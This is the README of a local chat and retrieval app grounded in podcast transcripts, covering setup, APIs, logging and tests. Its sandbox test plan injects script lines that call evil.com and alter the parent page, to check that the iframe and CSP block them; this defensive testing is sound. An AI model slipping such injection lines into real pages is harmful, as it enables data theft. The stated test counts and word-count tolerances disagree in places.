# The Lenny Growth Assistant

A local-first, zero-cost AI Growth and Product Assistant grounded in 260+ episodes of **Lenny's Podcast**. Ask tactical questions and receive answers cited directly from experienced operators, or generate structured growth frameworks and Ship 30/30 essays.

---

## Zero-Cost Stack Matrix

The entire application runs locally on open-source and free-tier infrastructure. No credit card or paid SaaS subscriptions are required.

| Layer | Technology | Why It's Free | Purpose in System |
| :--- | :--- | :--- | :--- |
| **Storage & Vectors** | PostgreSQL 16 + `pgvector` | Open source, runs locally via Docker Compose | Persistent storage for chunks, sessions, messages, and artifacts with HNSW cosine indexing. |
| **Embeddings** | Ollama (`nomic-embed-text`) | Local open weights, 100% free, no API key | Generates 768-dimensional dense vector embeddings locally on CPU/GPU. |
| **Primary LLM** | Ollama (`llama3.1:8b` / `llama3.2:3b`) | Local open weights, 100% free, runs offline | Mandatory local inference engine powering conversational Q&A and skill execution. |
| **Cloud LLM (Toggle)** | Groq (Llama 3.3) / Google Gemini Flash | Genuinely free API tiers (no card required) | Optional toggle for sub-2s cloud inference with automatic fallback to Ollama. |
| **Knowledge Base** | 269 Lenny's Podcast Transcripts | Open-source GitHub archive | Sourced from `ChatPRD/lennys-podcast-transcripts` with structured frontmatter. |
| **Backend API** | FastAPI (Python 3.11+) | Open source | Asynchronous REST backend, Pydantic schemas, and structured logging. |
| **Frontend UI** | React 19 + Vite | Open source | High-performance dual-pane chat and sandboxed workspace. |
| **Artifact Sandbox** | `<iframe sandbox>` + DOMPurify | Free browser primitives | Three-layer security isolation preventing DOM tampering or data exfiltration. |
| **Containerization** | Docker Compose | Free / Docker Desktop Community | One-command local deployment with persistent named volumes and healthchecks. |

---

## Transcript Source Attribution & Provenance

The knowledge base is built from the open-source transcript archive maintained at [`ChatPRD/lennys-podcast-transcripts`](https://github.com/ChatPRD/lennys-podcast-transcripts).
- **Corpus Size**: 269 complete episodes spanning conversations with world-class product, growth, and engineering leaders.
- **Format**: Structured Markdown with YAML frontmatter containing `title`, `guest`, `date`, and original `source_url`.
- **Licensing & Usage**: Community-transcribed open archive used solely for educational, evaluation, and non-commercial retrieval demonstration.
- **Attribution**: Every retrieved chunk preserves original speaker and episode metadata.

---

## Prerequisites

1. **Docker Desktop** installed and running.
2. **Ollama** installed and running on `http://localhost:11434`.
3. Pull the embedding model:
   ```bash
   ollama pull nomic-embed-text
   ```
4. **Python 3.11+** installed locally.

---

## Quickstart (One-Command Docker Compose)

The entire Lenny Growth Assistant stack runs with a single command via Docker Compose. No external cloud API keys or manual installations are required.

### 1. Prerequisites
- **Docker Desktop** installed and running.
- **Ollama** running locally on host (`http://localhost:11434`) with the embedding model:
  ```bash
  ollama pull nomic-embed-text
  ```

### 2. Configure Environment (Optional)
Copy the template configuration:
```bash
cp .env.example .env
```
All defaults connect automatically to host Ollama (`http://host.docker.internal:11434`) and local PostgreSQL.

### 3. Launch Services
Start all services in detached mode:
```bash
docker compose up -d
```

Compose automatically initializes:
- **`lenny_postgres`**: PostgreSQL 16 with `pgvector` extension and persistent storage (`postgres_data` named volume).
- **`lenny_backend`**: FastAPI asynchronous backend running as a secure non-root user (`appuser`, UID 10001) with internal healthchecks.
- **`lenny_frontend`**: Production React + Vite SPA served via Nginx with reverse-proxying for `/api/` and `/health`, and dual-port exposure.

### 4. Service Endpoints & Verification
| Service | URL | Notes |
| :--- | :--- | :--- |
| **Frontend UI** | `http://localhost` or `http://localhost:5173` | Production React SPA with dual-pane chat & sandboxed artifact viewer |
| **Nginx Health Proxy** | `http://localhost/health` | Multi-component health check proxied to FastAPI backend |
| **FastAPI Backend (Direct)** | `http://localhost:8000` | Direct backend API server |
| **Interactive API Docs** | `http://localhost:8000/docs` | Swagger / OpenAPI 3.1 documentation |
| **PostgreSQL 16** | `localhost:5432` | Vector database (`postgres` user / `lenny_growth` DB) |

Check container health status:
```bash
docker compose ps
```

Verify the health endpoint:
```bash
curl http://localhost/health
```

### 5. Run Data Ingestion (Docker Container)
Run the ingestion pipeline in a dedicated batch container without installing local Python dependencies:
```bash
# Ingest first 5 episodes (rapid smoke test):
docker compose run --rm ingest python scripts/ingest.py --limit 5

# Full archive ingestion (only new or changed transcripts):
docker compose run --rm ingest python scripts/ingest.py --refresh
```

### 6. Data Persistence & Teardown
Postgres data and vector embeddings persist across container stops and restarts via the `postgres_data` Docker volume:
```bash
# Stop containers (preserves database volume):
docker compose down

# Stop and delete database volume (fresh start):
docker compose down -v
```

---

## Local Development (Outside Docker)

If developing locally on host machine:

### 1. Database
Start only the PostgreSQL container:
```bash
docker compose up -d postgres
```

### 2. Python Backend
```bash
python -m venv .venv
# Windows:
.venv\Scripts\activate
# macOS/Linux:
source .venv/bin/activate

pip install -r backend/requirements.txt
uvicorn app.main:app --app-dir backend --reload --port 8000
```

### 3. Frontend Development
```bash
cd frontend
npm install
npm run dev
```

### 4. Host Ingestion Pipeline
```bash
python scripts/ingest.py --limit 5
```

---

## API Endpoints (Phase 2)

### Health Check
- `GET /health`: Multi-component granular health status reporting:
  - **PostgreSQL**: connection status and query latency in milliseconds (`latency_ms`).
  - **Ollama**: reachability status and array of locally installed models (`models_available`).
  - **Cloud LLM**: provider configuration status (`configured: true/false`, non-paid check).
  - Overall status: `healthy` (200 OK), `degraded` (200 OK, e.g. Ollama unreachable), or `unhealthy` (503 Service Unavailable, DB disconnected).

### Sessions & Persistence
- `POST /api/sessions`: Create a new session with optional `title` and `metadata`.
- `GET /api/sessions`: List all sessions ordered by `updated_at` descending.
- `GET /api/sessions/{session_id}`: Retrieve single session metadata.
- `DELETE /api/sessions/{session_id}`: Delete a session and cascade delete its messages and artifacts.
- `GET /api/sessions/{session_id}/messages`: Fetch all messages for a session in chronological order (`created_at ASC`).
- `POST /api/sessions/{session_id}/messages`: Append a message (`role`, `content`, optional `citations`, optional `served_by`).

### Configuration & LLM Routing (Phase 3)
- `GET /api/config`: Introspect active LLM router status and available models:
  ```json
  {
    "current_provider": "ollama",
    "current_model": "llama3.1:8b",
    "fallback_provider": "ollama",
    "fallback_model": "llama3.1:8b",
    "available_providers": ["ollama", "groq", "gemini"],
    "cloud_configured": false
  }
  ```

### Grounded RAG Chat (Phase 4)
- `POST /api/chat`: Send a question and receive a strictly grounded answer with structured citations:
  ```json
  // Request
  {
    "session_id": "56077338-9877-4f93-a57e-a942b7f7baf3", // optional
    "message": "What does Adam Fishman say about building a growth team?",
    "temperature": 0.7
  }
  ```
  ```json
  // Response
  {
    "session_id": "56077338-9877-4f93-a57e-a942b7f7baf3",
    "message_id": "0a930f68-3f23-4ea2-b5f0-b0ceb59f55ba",
    "role": "assistant",
    "content": "Based on the transcript excerpts, here are the key points Adam Fishman makes...",
    "citations": [
      {
        "episode_title": "How to build a high-performing growth team | Adam Fishman (Patreon, Lyft, Imperfect Foods)",
        "guest": "Adam Fishman",
        "source_url": "https://www.lennyspodcast.com/transcript"
      }
    ],
    "served_by": "ollama",
    "is_grounded": true
  }
  ```
  - **Strict Groundedness Guardrail**: If retrieved transcript similarity falls below threshold or the topic is not covered in Lenny's Podcast archives, the engine guarantees an honest refusal (`"is_grounded": false`, empty citations) rather than hallucinating.
  - **Multi-turn Context**: Automatically includes recent session messages (up to `RAG_HISTORY_TURNS=6`) so contextual follow-ups ("Can you summarize his 4 points into a list?") work seamlessly.
  - **Auto-Persistence**: Sessions and both user and assistant messages with citations and provider tracking are automatically persisted to PostgreSQL.

### Ship 30 for 30 Essay Generation (Phase 5)

Generates viral, highly actionable, long-form growth essays adhering strictly to the **Ship 30 for 30** editorial framework, fully grounded in podcast transcript context and saved to the `artifacts` table.

#### The 5 Editorial Pillars
1. **Strong Opening Hook**: A compelling question, bold counter-intuitive claim, or vivid operator scenario.
2. **Clear Narrative Arc**: Setup (the status quo / problem) $\rightarrow$ Tension / Core Insight (what high-growth leaders do differently) $\rightarrow$ Resolution (tactical implementation).
3. **Skimmable Formatting**: Clean Markdown headings (`##`, `###`), structured bullet points / numbered steps, and selective **bolding** for rapid skimming.
4. **One Central Restated Takeaway**: A dedicated concluding section summarizing the single most actionable rule of thumb.
5. **Source Provenance**: Footnotes or inline attributions citing the specific guest name and podcast episode for every key insight.

#### Endpoints
- `POST /api/artifacts/generate`: Generate a structured artifact from conversation context.
  - Supported `type` options:
    - `"ship30"`: Long-form growth essay (~1,250 words) adhering to the 5 Ship 30 pillars.
    - `"markdown"`: Executive brief, teardown summary, or tactical implementation checklist.
    - `"html"`: Complete standalone HTML document with embedded CSS and interactive JS widgets.
  ```json
  // Request
  {
    "session_id": "56077338-9877-4f93-a57e-a942b7f7baf3",
    "type": "html",
    "title": "Interactive CAC Payback Simulator",
    "source_message_id": null
  }
  ```
  ```json
  // Response
  {
    "id": "c6ca89cc-939c-42fa-83d8-342ecb14fbe9",
    "session_id": "56077338-9877-4f93-a57e-a942b7f7baf3",
    "type": "html",
    "title": "Interactive CAC Payback Simulator",
    "content": "<!DOCTYPE html><html><head><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'unsafe-inline';\">...</head><body>...</body></html>",
    "word_count": 350,
    "validation": {
      "is_valid": true,
      "word_count": 350,
      "target_word_count": 350,
      "has_hook": true,
      "has_headings": true,
      "has_bullets": true,
      "has_bold": true,
      "has_takeaway": true,
      "score": 1.0,
      "issues": []
    },
    "citations": [
      {
        "guest": "Elena Verna",
        "episode_title": "B2B Growth & Payback Period Benchmarks",
        "source_url": "https://www.lennyspodcast.com/transcript"
      }
    ],
    "created_at": "2026-09-15T01:50:00.000000Z"
  }
  ```
- `GET /api/sessions/{session_id}/artifacts`: List all generated artifacts for a session.
- `GET /api/artifacts/{artifact_id}`: Fetch single artifact by ID with on-the-fly validation metrics.

#### Sandboxed Artifact Viewer & Dual-Pane UI (Phase 6 & 7)

The React frontend includes a responsive dual-pane workspace with seamless end-to-end user workflows:
1. **Interactive Chat Stream**:
   - Empty state hero with 4 curated operator starter queries (Adam Fishman competencies, Elena Verna loops, Cold start tactics, CAC payback benchmarks).
   - Auto-resizing input box with Enter-to-send and Shift+Enter for multiline questions.
   - Markdown rendering for assistant answers (lists, headings, bold callouts, blockquotes).
   - **Collapsible Citations Section**: Displays grounded transcript sources, speaker names, episode titles, and links to transcripts.
   - **Quick Action Toolbar**: One-click generation of Ship 30 Essays, Executive Briefs, or standalone HTML widgets directly below assistant answers.
2. **Dual-Pane Sandboxed Artifact Viewer**:
   - Mounts smoothly in the right pane alongside the conversation stream with **zero full-page reload**.
   - **Rendered View**:
     - Renders interactive HTML in a strictly isolated `<iframe sandbox="allow-scripts">` with **no `allow-same-origin`**.
     - Pre-sanitizes HTML via `DOMPurify` to eliminate remote script sources (`<script src="...">`).
     - Injects mandatory restrictive Content Security Policy: `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'unsafe-inline';">`.
     - Renders Markdown and Ship 30 essays in styled typographic layouts with callouts and bold highlights.
   - **Raw Source View**:
     - Preformatted monospaced code view with one-click **Copy Source** and **Download (.html / .md)** buttons.
   - Expandable fullscreen mode or collapsible single-pane mode.
3. **Telemetry & Resilience Transparency**:
   - Header badge actively displays serving LLM (`Ollama: llama3.1:8b`).
   - Dynamic health dot (`Healthy`, `Degraded`, `Offline`) polling `/health`.
   - Real-time fallback warning banner when cloud rate limits trigger automatic routing to local Ollama.

### Observability, Structured Logging & Outage Resilience (Phase 8)

The backend incorporates zero-cost, enterprise-grade structured observability and outage resilience:

#### 1. Structured JSON Logging
All backend logs are emitted as single-line JSON records to stdout (`LOG_FORMAT=json`):
```json
{
  "timestamp": "2026-09-15T02:23:45Z",
  "level": "INFO",
  "logger": "app.services.rag.agent",
  "message": "RAG completion finished (1162.5ms) served by ollama",
  "request_id": "b3c6a7e2-4821-4b3f-9171-84197e889d12",
  "session_id": "123e4567-e89b-12d3-a456-426614174000",
  "event": "rag_completion_success",
  "provider": "ollama",
  "served_by": "ollama",
  "model": "llama3.1:8b",
  "retrieval_hits": 5,
  "top_similarity_score": 0.8241,
  "retrieval_latency_ms": 42.1,
  "llm_latency_ms": 1120.4,
  "total_latency_ms": 1162.5,
  "is_grounded": true
}
```
- Context variables (`contextvars`) automatically bind `request_id` and `session_id` to every asynchronous execution frame without manual parameter drilling.

#### 2. Request Tracing Middleware
- Injects or preserves `X-Request-ID` (UUID) across all logs and response headers.
- Emits `X-Response-Time-Ms` showing total round-trip processing duration.
- Emits structured `http_request_finished` logs with HTTP method, path, status, and latency.

#### 3. Standardized Error Envelopes (Zero Stack Trace Leakage)
The backend guarantees that raw stack traces, database credentials, and internal SQL statements are **never** leaked to clients:
```json
{
  "error": {
    "code": "DATABASE_UNAVAILABLE",
    "message": "The database is currently unreachable. Please ensure the PostgreSQL container is running.",
    "request_id": "b3c6a7e2-4821-4b3f-9171-84197e889d12",
    "status_code": 503
  },
  "detail": "The database is currently unreachable. Please ensure the PostgreSQL container is running."
}
```

| Error Code | HTTP Status | Trigger Condition | Operator Guidance |
|---|---|---|---|
| `DATABASE_UNAVAILABLE` | 503 | Postgres container offline or pool exhausted | Verify `docker compose up -d postgres` is healthy. |
| `OLLAMA_UNAVAILABLE` | 503 | Ollama daemon offline on port 11434 | Run `ollama serve` or ensure Ollama is running locally. |
| `INFERENCE_FAILED` | 502 | Both primary cloud and fallback Ollama fail | Check network connection or verify local model weights. |
| `SESSION_NOT_FOUND` | 404 | Session UUID does not exist | Create a new session via `POST /api/sessions`. |
| `VALIDATION_ERROR` | 422 | Invalid payload or missing fields | Check input format against Swagger documentation. |
| `INTERNAL_SERVER_ERROR`| 500 | Unhandled internal exception | Stack trace logged internally with `request_id`; safe envelope returned to user. |

---

## Running Automated Tests

### Backend Test Suite (pytest)
Run pytest across the entire backend test suite (ingestion, retrieval, health, sessions, RAG chat, Ship 30, multi-type artifacts, and resilience):
```bash
# In project root:
pytest -v
# Or using the local virtualenv:
.venv\Scripts\pytest -v
```
All 72 backend tests pass across ingestion, retrieval, health, chat, artifacts, and outage resilience.

### Frontend Test Suite (Vitest)
Run Vitest unit, security, and component tests:
```bash
cd frontend
npm test
```
All 23 frontend unit, integration, and security verification tests pass:
- `sanitize.test.ts`: DOMPurify sanitization & script strip verification.
- `SandboxedIframe.test.tsx`: Sandboxed iframe attributes (`allow-scripts` without `allow-same-origin`).
- `security.test.tsx`: XSS prevention and CSP meta tag enforcement.
- `SessionList.test.tsx`: Sessions list rendering, search filtering, "+ New Chat", and session deletion.
- `ChatFlow.test.tsx`: Starter queries, chat message dispatch, citation cards, and fallback badges.
- `ArtifactViewer.test.tsx`: Dual-view tabs (Rendered vs. Raw Source), copy to clipboard, and Markdown rendering.
- `ArtifactAction.test.tsx`: Quick action buttons, artifact generation, and sandboxed viewer mount with zero page reload.

---

## Running the Frontend Locally (Phase 7)

1. Start the backend on `http://localhost:8000`:
   ```bash
   uvicorn app.main:app --app-dir backend --reload --port 8000
   ```
2. In a separate terminal, start the Vite development server:
   ```bash
   cd frontend
   npm run dev
   ```
3. Open `http://localhost:5173` in your browser. All API requests (`/api/*`, `/health`) are automatically proxied to the backend.

---

## Automated Tests & Manual Verification Plan (Phase 10)

The project includes consolidated automated test suites across backend (Pytest) and frontend (Vitest / React Testing Library), along with an Evaluator Manual Test Plan for subjective flows.

### 1. Single-Command Test Runner

Execute both backend and frontend test suites consecutively with summary reporting:

```powershell
# Windows (PowerShell):
.\scripts\run_tests.ps1
```

```bash
# macOS / Linux / Git Bash:
./scripts/run_tests.sh
```

### 2. Individual Test Suites

#### Backend Pytest Suite (72 tests)
Runs isolated unit and integration tests with zero external network dependencies:
```bash
.venv\Scripts\pytest -v          # Windows
./.venv/bin/pytest -v            # macOS / Linux
```
- Multi-component `/health` check under healthy and degraded states.
- Session CRUD, cascading deletes, and message ordering.
- Cosine similarity ranking, keyword boosting, and threshold filtering.
- LLM Router auto-fallback on HTTP 429 rate limit or timeout (`served_by: "ollama-fallback"`).
- Grounded RAG chat citations and anti-hallucination refusal on out-of-scope queries.
- Ship 30 essay structure and word count boundaries (~1,250 words ± 20%).
- Markdown and HTML artifact generation with CSP meta tag injection.
- Standardized error envelopes (503 on DB/Ollama outage, 422, 500) and `X-Request-ID` propagation.

#### Frontend Vitest / RTL Suite (33 tests)
Runs React component and security isolation tests:
```bash
cd frontend
npm test -- --run
```
- Chat submission, assistant reply rendering, expandable citation toggles.
- Session creation, switching, and deletion.
- Artifact viewer tab switching (Rendered vs Raw), copy code to clipboard, file download triggers.
- **Security Sandboxing**: Iframe strictly omits `allow-same-origin`, DOMPurify strips evil payloads, and CSP blocks external network exfiltration.
- **Model Badges**: Telemetry display and `⚠️ Ollama Fallback` warning badge rendering.

---

### 3. Evaluator Manual Test Plan

For subjective quality checks and browser sandbox verification, follow the comprehensive guide in [`docs/TEST_PLAN.md`](docs/TEST_PLAN.md):

1. **Grounded Retrieval vs. Out-of-Scope Refusal**:
   - Query A (*"What is Shreyas Doshi's advice on customer obsession vs. customer empathy?"*): Returns grounded answer citing episode and guest.
   - Query B (*"How do I design a nuclear propulsion engine in Rust?"*): Returns honest refusal (*"I couldn't find coverage of this topic..."*) with zero hallucinations.
2. **Zero-Downtime Cloud Fallback**:
   - Set `LLM_PROVIDER=cloud` with an invalid `CLOUD_LLM_API_KEY`.
   - Submit a query: Request succeeds seamlessly via local Ollama, displaying the `⚠️ Ollama Fallback` warning badge in the UI.
3. **Artifact Viewer Security Sandbox Escape Attempt**:
   - Render an HTML artifact containing `<script>window.parent.document.title = 'Hacked';</script>` and `<script>fetch('https://evil.com')</script>`.
   - Verify DevTools: Iframe runs in an opaque origin (`null`), blocking DOM parent access, and CSP directive `default-src 'none'` blocks network calls.
4. **Ship 30 for 30 Essay Generation**:
   - Click *"Turn into Ship 30 Essay"* on a growth query: Verifies Headline, Hook, Narrative, Bullets, and Takeaway structure with ~1,250 words and traceable citations.

See [`docs/TEST_PLAN.md`](docs/TEST_PLAN.md) for full step-by-step instructions and DevTools inspection commands.

---

## Troubleshooting Guide

### 1. Port Conflicts (5432, 8000, 80, 5173)
- **Symptom**: `Error starting userland proxy: listen tcp4 0.0.0.0:5432: bind: address already in use` or port 80/8000.
- **Cause**: A local PostgreSQL service, another development server, or an existing container is binding to the host port.
- **Remediation**:
  - Check running containers: `docker ps`.
  - Override host ports in `.env`:
    ```bash
    POSTGRES_PORT=5433
    BACKEND_PORT=8001
    FRONTEND_PORT=8080
    ```
  - Stop local PostgreSQL daemon: `net stop postgresql` (Windows) or `sudo systemctl stop postgresql` (Linux).

### 2. Ollama Connection Issues (`host.docker.internal`)
- **Symptom**: Backend logs show `httpx.ConnectError` or `/health` returns `ollama: { status: "unreachable" }`.
- **Cause**: Ollama is not running on the host machine or is not listening on all interfaces.
- **Remediation**:
  - Verify Ollama is running on the host: `curl http://localhost:11434`.
  - On Linux hosts without `host.docker.internal` DNS: Set `DOCKER_OLLAMA_BASE_URL=http://172.17.0.1:11434` in `.env`.
  - Ensure Ollama accepts connections: Set `OLLAMA_HOST=0.0.0.0:11434` when starting Ollama.
  - Pull required models:
    ```bash
    ollama pull nomic-embed-text
    ollama pull llama3.1:8b
    ```

### 3. Windows PowerShell Script Execution Policy
- **Symptom**: `scripts\run_tests.ps1 cannot be loaded because running scripts is disabled on this system`.
- **Remediation**:
  - Run with bypass parameter:
    ```powershell
    powershell -ExecutionPolicy Bypass -File .\scripts\run_tests.ps1
    ```
  - Or enable for current process:
    ```powershell
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
    ```

### 4. Database Volume Permissions or Schema Reinitialization
- **Symptom**: Ingestion errors or missing tables after unclean termination.
- **Remediation**:
  - Perform a clean volume restart:
    ```bash
    docker compose down -v
    docker compose up -d
    ```
  - The `docker/init.sql` script will automatically re-create extensions and tables on fresh volume creation.

---

## Manual Test Plan

A step-by-step verification checklist for evaluators and operators:

### Test Case 1: One-Command Boot & Healthcheck
1. Ensure Ollama is running with `ollama run llama3.2:3b` and `nomic-embed-text`.
2. Run `docker compose up -d`.
3. Verify all 3 services (`lenny_postgres`, `lenny_backend`, `lenny_frontend`) are healthy:
   ```bash
   docker compose ps
   ```
4. Access `http://localhost:8000/health` in browser or curl:
   - Expect HTTP 200 with `"status": "healthy"`, `"postgres": "connected"`, and `"ollama": "running"`.
5. Access `http://localhost:5173/` or `http://localhost/`:
   - Expect modern Claude/ChatGPT-style dual-pane UI with dark mode and active green "Healthy" badge.

### Test Case 2: Grounded Q&A & Refusal Verification
1. In the chat input, ask: *"What are the key competencies of a growth team according to Adam Fishman?"*
   - Expect a detailed tactical answer attributing insights to Adam Fishman.
   - Expect citations list showing episode title, guest name, exact timestamp `[00:05:56]`, verbatim quote snippet, and YouTube/transcript link.
2. Ask an unmentioned topic: *"What are the quantum computing algorithms discussed on the show?"*
   - Expect an honest refusal:
     > *"I couldn't find coverage of this topic in the available Lenny's Podcast transcripts."*
   - Expect 0 citations and no hallucinated claims.

### Test Case 3: Interactive Model Selector & Ollama Fallback
1. In the header, click the Model Selector dropdown trigger button.
2. Verify popover displays two sections:
   - **Local Models**: `Llama 3.2 (3B)` (Fast) and `Llama 3.1 (8B)` (Quality) with checkmarks.
   - **Cloud APIs**: `Gemini 1.5 Flash`, `Groq Llama 3.3 (70B)`, `Claude 3.5 Sonnet`, `GPT-4o Mini`.
3. Note warning pill: unconfigured cloud models display `Key missing` with helpful tooltip.
4. Select `Claude 3.5 Sonnet` (without `ANTHROPIC_API_KEY` set) and send a prompt:
   - Request completes without throwing an error.
   - Response message bubble displays `⚠️ Requested Claude 3.5 (Key Missing) — Served via Local Ollama Fallback` amber badge.
5. Click **"View Provider Status & Fallback Info"** in the dropdown footer:
   - Modal drawer displays local infrastructure health and credentials telemetry.

### Test Case 4: Ship 30 for 30 Essay Generation
1. Under any grounded assistant response, click **"Turn into Ship 30 Essay"**.
2. Watch the right split-pane open automatically with a loading indicator.
3. Once generated, inspect the essay:
   - Strong opening hook without throat-clearing.
   - 3-part narrative progression (Setup $\rightarrow$ Tension $\rightarrow$ Resolution).
   - Skimmable subheadings (`##`), bullet points, and selective bolding.
   - Restated takeaway section (`## The One Takeaway`).
   - Word count displayed in toolbar is within ~10% of 1,250 words (~1,125 to ~1,375 words).

### Test Case 5: Sandboxed Artifact Viewer & Security Isolation
1. Click **"Interactive Widget"** or generate an HTML artifact.
2. Inspect the iframe in DevTools:
   - Verify `sandbox="allow-scripts"` is present.
   - Verify `allow-same-origin` is **strictly absent**.
   - Verify `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'unsafe-inline';">` is in the `<head>` of `srcdoc`.
3. In browser console, attempt to access parent from sandbox or run `fetch()`:
   - Outbound network requests (`fetch`, `XMLHttpRequest`) are blocked by CSP.
   - Parent storage (`window.parent.localStorage`) and parent cookies (`parent.document.cookie`) are blocked by opaque origin.
4. Switch between **Rendered View** and **Raw Source** tabs to inspect source code.
5. Click **Copy** (shows "Copied" checkmark) and **Download** (downloads `.html` or `.md` file).

---

## Project Structure

```
lenny-growth-assistant/
├── backend/
│   ├── app/
│   │   ├── config.py         # Pydantic settings (inc. RAG & SHIP30 params)
│   │   ├── database.py       # SQLAlchemy engine & session factory
│   │   ├── models.py         # SQLAlchemy ORM models (sessions, messages, chunks, artifacts)
│   │   ├── schemas.py        # Pydantic schemas (sessions, messages, rag, artifacts)
│   │   ├── core/             # Structured JSON logging & custom exceptions
│   │   ├── middleware/       # TraceMiddleware (X-Request-ID, response latency)
│   │   ├── routers/
│   │   │   ├── health.py     # Multi-component /health endpoint
│   │   │   ├── sessions.py   # Sessions & messages REST endpoints
│   │   │   ├── chat.py       # Grounded RAG chat endpoint
│   │   │   ├── config.py     # LLM router introspection endpoint
│   │   │   └── artifacts.py  # Artifact generation & retrieval endpoints
│   │   ├── services/
│   │   │   ├── llm/          # LLM router, Ollama, and cloud providers
│   │   │   └── rag/          # Grounded retrieval, prompt builder, citations
│   │   ├── skills/
│   │   │   ├── __init__.py   # Skills module exports
│   │   │   ├── base.py       # BaseSkill abstract interface
│   │   │   ├── ship30.py     # Ship 30 for 30 skill generator & validator
│   │   │   ├── markdown.py   # Markdown executive brief skill
│   │   │   └── html.py       # Standalone HTML artifact skill with CSP
│   │   └── main.py           # FastAPI entrypoint, CORS, exception handlers
│   ├── db/
│   │   ├── init.sql          # Postgres extension initialization
│   │   └── schema.sql        # Tables: chunks, sessions, messages, artifacts
│   ├── tests/                # 72 comprehensive Pytest tests
│   │   ├── conftest.py       # Test fixtures and database setup
│   │   ├── test_health.py    # Multi-component health check tests
│   │   ├── test_sessions.py  # Session & message persistence tests
│   │   ├── test_retrieval.py # Cosine ranking & keyword boost tests
│   │   ├── test_llm_router.py# Provider routing & 429 fallback tests
│   │   ├── test_chat.py      # Grounded RAG chat endpoint tests
│   │   ├── test_ship30.py    # Ship 30 skill & word count tests
│   │   ├── test_artifacts.py # Markdown/HTML generation & CSP injection tests
│   │   └── test_resilience.py# 503 error envelopes & JSON logging tests
│   ├── Dockerfile            # Multi-stage non-root container definition
│   └── requirements.txt      # Backend pinned dependencies
├── frontend/
│   ├── src/
│   │   ├── api/              # Axios/Fetch API client modules
│   │   ├── components/       # Chat, Sidebar, ArtifactViewer, Layout components
│   │   ├── context/          # ChatContext & ConfigContext state management
│   │   ├── utils/            # DOMPurify HTML sanitization routines
│   │   └── tests/            # 33 Vitest / RTL component & security tests
│   │       ├── ChatFlow.test.tsx
│   │       ├── SessionList.test.tsx
│   │       ├── ArtifactViewer.test.tsx
│   │       ├── SandboxSecurity.test.tsx
│   │       └── ModelBadge.test.tsx
│   ├── Dockerfile            # Multi-stage Node builder + Nginx Alpine runtime
│   ├── nginx.conf            # Reverse proxy & SPA routing configuration
│   └── package.json          # React 19, Vite, Vitest dependencies
├── docker/
│   └── init.sql              # Combined schema & extensions initialization
├── docs/
│   └── TEST_PLAN.md          # Evaluator manual verification guide
├── scripts/
│   ├── chunker.py            # Token-aware speaker & heading chunker
│   ├── ingest.py             # Transcript parser, embedder, and upsert script
│   ├── run_tests.ps1         # Windows single-command test runner
│   └── run_tests.sh          # Linux/macOS single-command test runner
├── tests/
│   ├── test_chunker.py       # Chunk size & overlap tests
│   └── test_ingest.py        # Idempotency and parsing tests
├── agent-transcripts/        # Verifiable agent session logs per phase (0–12)
├── data/
│   └── raw/                  # Downloaded raw transcripts (gitignored)
├── docker-compose.yml        # Multi-container orchestration (postgres, backend, frontend, ingest)
├── .env.example              # Sample environment configuration
├── requirements.txt          # Root Python dependencies
├── pyproject.toml            # Project metadata and tool configuration
├── ROADMAP.md                # Project roadmap and architectural constraints
├── PRD.md                    # Product requirements document
├── design.md                 # UI/UX and artifact sandbox security spec
└── architecture.md           # Architecture diagrams and system design
```
